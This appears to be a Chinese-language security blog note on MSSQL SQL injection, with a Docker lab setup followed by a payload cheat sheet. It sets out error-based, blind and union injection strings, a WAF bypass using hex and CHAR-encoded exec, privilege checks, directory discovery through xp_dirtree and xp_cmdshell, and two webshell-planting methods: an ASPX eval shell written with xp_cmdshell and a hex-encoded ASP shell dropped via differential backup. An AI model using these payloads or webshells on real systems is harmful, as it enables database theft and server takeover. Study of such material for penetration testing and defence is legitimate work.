---
data: 2024-07-04
tags:
  - 常见漏洞
博客链接: https:/www.cnblogs.com/Ho1dF0rward/p/18284883
关联:
  - "[[Sql注入Playload]]"
---

## 环境搭建
```
sudo docker pull mcr.microsoft.com/mssql/server:2022-latest
docker run -e "ACCEPT_EULA=Y" -e "SA_PASSWORD=Y.sa123456" -p 1433:1433 --name mssql2022 -d mcr.microsoft.com/mssql/server:2022-latest
```
然后使用客户端连接即可
```
用户名 sa
密码 Y.sa123456
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/27874700/1716526018621-3aa04e8e-d522-488c-b72e-da323506ebec.png#averageHue=%23f6f6f5&clientId=uf3f8dbdd-6bac-4&from=paste&height=553&id=u4141b84d&originHeight=553&originWidth=1185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63510&status=done&style=none&taskId=uc574f41b-c76e-4110-9dbb-80e34370def&title=&width=1185)
[Docker安装MS SQL Server并使用Navicat远程连接 - 追逐时光者 - 博客园](https://www.cnblogs.com/Can-daydayup/p/17455612.html)
## 注入细节
[MSSQL_SQL_BYPASS_WIKI/一篇了解MSSQL.md at master · aleenzz/MSSQL_SQL_BYPASS_WIKI](https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/%E4%B8%80%E7%AF%87%E4%BA%86%E8%A7%A3MSSQL.md)
### 基础使用
#### 查询
```
SELECT name 
FROM sys.tables;  -- 输出数据库所有的表名字
```
#### 注释
```
单行注释
--
多行注释
/* 
测试
测试
*/
```
#### 关键字
```
@@version // 数据库版本

user  //获取当前数据库用户名

db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库

;select user //查询是否支持多语句
1'and host_name()=@@servername;--'判断是否站库分离
```
### 注入步骤
#### 判断当前数据库
```
1'and db_name()>0;--
```
#### 爆表名
```
1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');--
```
#### 暴列名
```
1' and 1=(select top 1 name from syscolumns where id
=(select id from sysobjects where name = 'admin') and name<>'id');--
```
#### 爆数据
```
1' and 1=(select top 1 username from admin);--

```
### 进阶使用
#### 报错注入其他方式
使用函数来进行一个处理
```
select * from admin where id =1 (select CAST(USER as int))
select * from admin where id =1 (select convert(int,user))
```
#### waf绕过
使用declare ,进行局部变量声明.然后配合hex和ascii码来进行一个对应的绕过.
```
select * from admin where id =1;declare @a nvarchar(2000) set @a='select convert(int,@@version)' exec(@a) --
select * from admin where id =1;declare @s varchar(2000) set @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 exec(@s)--
select * from admin where id =1;declare @s varchar(2000) set @s= CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(99) + CHAR(111) + CHAR(110) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(116) + CHAR(40) + CHAR(105) + CHAR(110) + CHAR(116) + CHAR(44) + CHAR(64) + CHAR(64) + CHAR(118) + CHAR(101) + CHAR(114) + CHAR(115) + CHAR(105) + CHAR(111) + CHAR(110) + CHAR(41) exec(@s)--
```
#### 布尔盲注
```
1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) >= 109
```
#### 时间盲注
```
1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--

1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))>
1 WAITFOR DELAY '0:0:5'--
```
#### 联合注入
相较于mysql注入,一般是使用null来进行一个对应的占位
```
1 union select null,name,pass --
```
### shell获取
#### 权限判断
```
and 1=(select is_srvrolemember('sysadmin'))

and 1=(select is_srvrolemember('serveradmin'))

and 1=(select is_srvrolemember('setupadmin'))

and 1=(select is_srvrolemember('securityadmin'))

and 1=(select is_srvrolemember('diskadmin'))

and 1=(select is_srvrolemember('bulkadmin'))


select IS_MEMBER('db_owner')  

```
#### 寻找网站目录
使用xp_dirtree
```
1;CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
1;insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1
```
直接使用xp_cmdshell
```
1;CREATE TABLE cmdtmp (dir varchar(8000));
1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
```
尝试读注册xp_regread
```
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/'
```
#### shell写入
直接使用xp_cmdshell写入
```
1;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\404.aspx' ;
```
使用差异备份
```
1. backup database 库名 to disk = 'c:\bak.bak';--

2. create table [dbo].[test] ([cmd] [image]);

3. insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E)

4. backup database 库名 to disk='C:\d.asp' WITH DIFFERENTIAL,FORMAT;--

```
